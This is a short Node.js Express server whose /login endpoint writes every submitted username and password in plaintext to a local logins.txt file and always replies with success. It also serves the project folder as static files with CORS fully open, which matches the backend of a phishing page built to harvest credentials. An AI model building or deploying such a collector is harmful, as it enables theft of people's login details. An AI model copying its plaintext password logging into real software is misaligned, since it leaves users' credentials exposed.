const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000; // Use Render's port if available

app.use(cors());
app.use(bodyParser.json());


app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
    fs.appendFile('logins.txt', logEntry, (err) => {
        if (err) {
            console.error('Error writing to file', err);
        }
    });
    res.json({ success: true, message: 'Received!' });
});
app.use(express.static(__dirname));
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
